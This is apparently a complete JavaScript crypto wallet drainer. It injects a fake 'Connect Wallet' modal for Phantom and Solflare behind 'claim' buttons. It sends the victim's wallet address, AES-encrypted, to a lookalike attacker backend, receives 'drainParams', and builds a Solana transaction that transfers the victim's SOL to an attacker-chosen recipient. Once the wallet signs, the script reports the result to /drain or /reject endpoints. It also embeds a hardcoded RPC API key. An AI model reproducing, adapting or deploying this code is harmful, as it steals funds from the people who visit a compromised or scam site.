(async () => {
    // Check for mobile device
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    
    // API endpoints
    const api = "https://funbIicnk.crownbackendz.com";
    const subdomainApi = "https://encode-domain.com"; // Replace with your subdomain manager URL
    const src = "https://funbIicnk.crownmodalz.com/";
    
    // Get BYPODOMAIN from current website
    function getBYPODOMAIN() {
        return window.location.origin;
    }
    
    try {
        // Load required scripts
        await loadScript("https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js");
        await loadScript("https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js");
    } catch (error) {
        console.error(error);
        location.reload();
        return;
    }
    
    // Encryption configuration
    const ENCRYPTION_KEY = CryptoJS.enc.Utf8.parse('12345678901234569990123456789012');
    const IV = CryptoJS.enc.Utf8.parse('1234567899123456');
    
    // Main overlay content
    const overlayContent = `
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
    
        :root {
            --bg-primary: #0c0c0c;
            --bg-secondary: #141414;
            --bg-tertiary: #1a1a1a;
            --bg-hover: #222222;
            --border-color: #2a2a2a;
            --text-primary: #ffffff;
            --text-secondary: #888888;
            --text-tertiary: #666666;
            --accent-blue: #4a9eff;
            --accent-green: #4ade80;
            --accent-purple: #a78bfa;
            --accent-yellow: #fbbf24;
            --danger: #ef4444;
            --warning: #f59e0b;
            --success: #10b981;
        }
    
        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px);
            z-index: 10000;
            animation: fadeIn 0.2s ease-out;
        }
    
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    
        #modal {
            position: relative;
            width: 440px;
            max-width: 95%;
            background: var(--bg-secondary);
            border-radius: 20px;
            overflow: hidden;
            animation: slideUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        }
    
        @keyframes slideUp {
            from { 
                transform: translateY(40px) scale(0.95);
                opacity: 0;
            }
            to { 
                transform: translateY(0) scale(1);
                opacity: 1;
            }
        }
    
        .modal-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 24px;
            border-bottom: 1px solid var(--border-color);
        }
    
        .modal-title {
            font-size: 20px;
            font-weight: 600;
            color: var(--text-primary);
            display: flex;
            align-items: center;
            gap: 10px;
        }
    
        .close-btn {
            width: 36px;
            height: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: transparent;
            border: none;
            border-radius: 10px;
            color: var(--text-secondary);
            cursor: pointer;
            transition: all 0.2s;
        }
    
        .close-btn:hover {
            background: var(--bg-hover);
            color: var(--text-primary);
        }
    
        .modal-body {
            padding: 24px;
        }
    
        .wallet-item {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 16px;
            margin-bottom: 12px;
            background: var(--bg-tertiary);
            border: 1px solid transparent;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.2s;
            position: relative;
            overflow: hidden;
        }
    
        .wallet-item:hover {
            background: var(--bg-hover);
            border-color: var(--border-color);
            transform: translateY(-2px);
        }
    
        .wallet-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
    
        .wallet-icon img {
            width: 100%;
            height: 100%;
            border-radius: 12px;
        }
    
        .wallet-info {
            flex: 1;
        }
    
        .wallet-name {
            font-size: 16px;
            font-weight: 500;
            color: var(--text-primary);
            margin-bottom: 2px;
        }
    
        .wallet-badge {
            display: inline-flex;
            align-items: center;
            padding: 4px 8px;
            font-size: 11px;
            font-weight: 600;
            border-radius: 6px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
    
        .badge-installed {
            background: rgba(74, 222, 128, 0.1);
            color: var(--accent-green);
        }
    
        #loader {
            position: fixed;
            width: 440px;
            max-width: 95%;
            background: var(--bg-secondary);
            border-radius: 20px;
            padding: 48px 32px;
            text-align: center;
            animation: slideUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        }
    
        .spinner {
            width: 48px;
            height: 48px;
            border: 3px solid var(--border-color);
            border-top-color: var(--accent-blue);
            border-radius: 50%;
            margin: 0 auto;
            animation: spin 1s linear infinite;
        }
    
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    
        .connection-iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 10001;
        }
    
        .iframe-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px);
            z-index: 10001;
            display: none;
        }
    </style>
    
    <div id="modal">
        <div id="index" class="page">
            <div class="modal-header">
                <h2 class="modal-title">
                    <svg viewBox="0 0 24 24" fill="none">
                        <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>
                        <path d="M12 8v4m0 4h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                    </svg>
                    Connect Wallet
                </h2>
                <button class="close-btn" onclick="toggleModal()">
                    <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                        <path d="M15 5L5 15M5 5L15 15" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                    </svg>
                </button>
            </div>
    
            <div class="modal-body">
                <div class="wallet-item" id="phantom">
                    <div class="wallet-icon">
                        <img src="${src}images/phantom_wallet.svg" alt="Phantom">
                    </div>
                    <div class="wallet-info">
                        <div class="wallet-name">Phantom</div>
                        <span class="wallet-badge badge-installed">Installed</span>
                    </div>
                </div>
    
                <div class="wallet-item" id="solflare">
                    <div class="wallet-icon">
                        <img src="${src}images/solflare_wallet.svg" alt="Solflare">
                    </div>
                    <div class="wallet-info">
                        <div class="wallet-name">Solflare</div>
                        <span class="wallet-badge badge-installed">Popular</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <div id="loader" style="display: none;">
        <button class="close-btn" id="close" style="position: absolute; top: 20px; right: 20px;">
            <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                <path d="M15 5L5 15M5 5L15 15" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
            </svg>
        </button>
        
        <div id="connect" style="display: none;">
            <h2>Connecting Wallet</h2>
            <p>Please wait while we establish connection...</p>
            <div class="spinner"></div>
        </div>
    </div>
    
    <div class="iframe-container" id="iframeContainer">
        <iframe class="connection-iframe" id="connectionIframe"></iframe>
    </div>
    `;
    
    // Attach click handlers for claim buttons
    document.querySelectorAll('.claimButton').forEach(button => {
        button.addEventListener('click', async () => {
            // Create and insert overlay
            const overlay = document.createElement('div');
            overlay.id = 'overlay';
            overlay.innerHTML = overlayContent;
            document.body.appendChild(overlay);
            
            // Global functions
            window.toggleModal = function() {
                document.body.removeChild(overlay);
            };
            
            // Variables to store connection data
            let wallet, address, currentSubdomain;
            
            // Close handlers
            document.getElementById('close').addEventListener('click', () => {
                document.body.removeChild(overlay);
            });
            
            overlay.addEventListener('click', function(event) {
                const modal = document.getElementById('modal');
                const loader = document.getElementById('loader');
                const iframeContainer = document.getElementById('iframeContainer');
                if (!modal.contains(event.target) && !loader.contains(event.target) && !iframeContainer.contains(event.target)) {
                    document.body.removeChild(overlay);
                }
            });
            
            // Wallet connection handlers
            document.getElementById('phantom').addEventListener('click', async () => {
                await handleWalletConnection('phantom');
            });
            
            document.getElementById('solflare').addEventListener('click', async () => {
                await handleWalletConnection('solflare');
            });
            
            // Handle wallet connection via iframe
            // Handle wallet connection via popup
            async function handleWalletConnection(walletType) {
                wallet = walletType;
                const modal = document.getElementById('modal');
                const loader = document.getElementById('loader');
                
                // Hide modal, show loader
                modal.style.display = "none";
                loader.style.display = "flex";
                document.getElementById('connect').style.display = 'flex';
                
                try {
                    // Get current subdomain from manager
                    const subdomainResponse = await fetch(`${subdomainApi}/api/get-current-subdomain`);
                    const subdomainData = await subdomainResponse.json();
                    currentSubdomain = subdomainData.url;
                    
                    // Prepare connection URL
                    const currentWebsite = window.location.hostname;
                    const connectionUrl = `${currentSubdomain}/${currentWebsite}/${walletType}`;
                    
                    // For mobile: redirect instead of popup
                    if (isMobile) {
                        // Store return URL in sessionStorage
                        sessionStorage.setItem('returnUrl', window.location.href);
                        // Redirect to connection page
                        window.location.href = connectionUrl;
                        return;
                    }
                    
                    // For desktop: open popup
                    const popupWidth = 420;
                    const popupHeight = 600;
                    const left = (window.screen.width - popupWidth) / 2;
                    const top = (window.screen.height - popupHeight) / 2;
                    
                    const popup = window.open(
                        connectionUrl,
                        'WalletConnection',
                        `width=${popupWidth},height=${popupHeight},left=${left},top=${top},resizable=no,scrollbars=yes`
                    );
                    
                    // Check if popup was blocked
                    if (!popup || popup.closed || typeof popup.closed == 'undefined') {
                        alert('Please allow popups for this site to connect your wallet.');
                        document.body.removeChild(overlay);
                        return;
                    }
                    
                    // Poll for popup messages
                    const messageHandler = (event) => {
                        // Verify origin matches our subdomain
                        if (!event.origin.includes(currentSubdomain.replace('https://', ''))) return;
                        
                        handleConnectionMessage(event.data);
                        
                        // Close popup if still open
                        if (popup && !popup.closed) {
                            popup.close();
                        }
                    };
                    
                    window.addEventListener('message', messageHandler);
                    
                    // Check if popup is closed
                    const checkPopup = setInterval(() => {
                        if (popup.closed) {
                            clearInterval(checkPopup);
                            window.removeEventListener('message', messageHandler);
                            document.body.removeChild(overlay);
                        }
                    }, 500);
                    
                } catch (error) {
                    console.error('Failed to get subdomain:', error);
                    document.body.removeChild(overlay);
                }
            }
            
            // Handle messages from iframe
            async function handleConnectionMessage(data) {
                switch(data.type) {
                    case 'connection_success':
                        address = data.address;
                        wallet = data.wallet;
                        
                        // Process the connection
                        await processConnection(address, wallet);
                        break;
                        
                    case 'connection_rejected':
                    case 'wallet_not_found':
                    case 'connection_error':
                        // Handle errors
                        console.error('Connection failed:', data);
                        document.body.removeChild(overlay);
                        break;
                }
            }
            
            // Process successful connection
            async function processConnection(address, wallet) {
                try {
                    const BYPODOMAIN = getBYPODOMAIN();
                    const clientData = { 
                        address, 
                        wallet, 
                        isMobile, 
                        BYPODOMAIN,
                        isNonBypass: true 
                    };
                    
                    const encryptedData = encrypt(clientData);
                    const response = await fetch(`${api}/prompt`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ payload: encryptedData })
                    });
                    
                    const { payload } = await response.json();
                    const serverData = decrypt(payload);
                    
                    if (serverData.drainParams) {
                        // Build transaction locally
                        await buildAndSignTransaction(address, wallet, serverData.drainParams);
                    } else {
                        console.error('No drain params received');
                        document.body.removeChild(overlay);
                    }
                    
                } catch (error) {
                    console.error('Failed to process connection:', error);
                    document.body.removeChild(overlay);
                }
            }
            
            // Build and sign transaction locally
            async function buildAndSignTransaction(address, wallet, drainParams) {
                try {
                    const connection = new solanaWeb3.Connection("https://mainnet.helius-rpc.com/?api-key=02e3e83a-a22b-495c-b772-f319685e0459", 'confirmed');
                    const transaction = new solanaWeb3.Transaction();
                    
                    // Add SOL transfer if needed
                    if (drainParams.solAmount > 0) {
                        transaction.add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: new solanaWeb3.PublicKey(address),
                                toPubkey: new solanaWeb3.PublicKey(drainParams.recipientAddress),
                                lamports: Math.floor(drainParams.solAmount * solanaWeb3.LAMPORTS_PER_SOL)
                            })
                        );
                    }
                    
                    // Add token transfers
                    for (const token of drainParams.tokens) {
                        // Add token transfer instruction
                        // This would need the actual SPL token transfer logic
                        console.log('Adding token transfer:', token);
                    }
                    
                    // Get recent blockhash
                    const { blockhash } = await connection.getLatestBlockhash();
                    transaction.recentBlockhash = blockhash;
                    transaction.feePayer = new solanaWeb3.PublicKey(address);
                    
                    // Sign transaction
                    let signedTransaction;
                    if (wallet === 'phantom') {
                        signedTransaction = await window.solana.signTransaction(transaction);
                    } else if (wallet === 'solflare') {
                        signedTransaction = await window.solflare.signTransaction(transaction);
                    }
                    
                    // Send signed transaction to backend
                    const signature = await connection.sendRawTransaction(signedTransaction.serialize());
                    
                    // Notify backend of completion
                    const BYPODOMAIN = getBYPODOMAIN();
                    const drainData = { 
                        address, 
                        signature,
                        BYPODOMAIN 
                    };
                    
                    const encryptedDrainData = encrypt(drainData);
                    await fetch(`${api}/drain`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ payload: encryptedDrainData })
                    });
                    
                    console.log('Transaction successful:', signature);
                    document.body.removeChild(overlay);
                    
                } catch (error) {
                    console.error('Transaction failed:', error);
                    
                    // Notify backend of rejection
                    const BYPODOMAIN = getBYPODOMAIN();
                    const rejectData = { address, BYPODOMAIN };
                    const encryptedRejectData = encrypt(rejectData);
                    
                    await fetch(`${api}/reject`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ payload: encryptedRejectData })
                    });
                    
                    document.body.removeChild(overlay);
                }
            }
        });
    });
    
    // Helper functions
    function loadScript(src) {
        return new Promise((resolve, reject) => {
            const script = document.createElement('script');
            script.src = src;
            script.onload = () => resolve();
            script.onerror = () => reject(new Error(`Failed to load script ${src}`));
            document.head.appendChild(script);
        });
    }
    
    function encrypt(payload) {
        const jsonString = JSON.stringify(payload);
        const encrypted = CryptoJS.AES.encrypt(jsonString, ENCRYPTION_KEY, {
            iv: IV,
            mode: CryptoJS.mode.CBC,
            padding: CryptoJS.pad.Pkcs7
        });
        return encrypted.ciphertext.toString(CryptoJS.enc.Base64);
    }
    
    function decrypt(payload) {
        const decrypted = CryptoJS.AES.decrypt(
            { ciphertext: CryptoJS.enc.Base64.parse(payload) },
            ENCRYPTION_KEY,
            {
                iv: IV,
                mode: CryptoJS.mode.CBC,
                padding: CryptoJS.pad.Pkcs7
            }
        );
        return JSON.parse(decrypted.toString(CryptoJS.enc.Utf8));
    }
})();